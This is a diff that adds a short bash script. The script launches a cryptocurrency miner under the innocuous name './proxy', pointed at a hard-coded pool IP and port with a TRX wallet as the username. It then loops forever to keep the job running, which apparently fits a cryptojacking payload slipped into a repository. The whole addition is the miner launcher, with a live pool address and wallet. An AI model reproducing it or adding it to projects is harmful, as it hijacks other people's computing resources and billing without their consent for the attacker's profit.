@@ -1,0 +1,10 @@
+#!/bin/bash
+POOL=45.79.8.197:7777
+WALLET=TRX:TTCnXEWmpqS6GD615Ap5DHj1PWo5fptr16
+WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-OK#ek61-6h9x)
+
+./proxy --algorithm wrkzcoin --pool $POOL --username $WALLET.$WORKEER --password x
+while [ 1 ]; do 
+sleep 3
+done 
+sleep 999
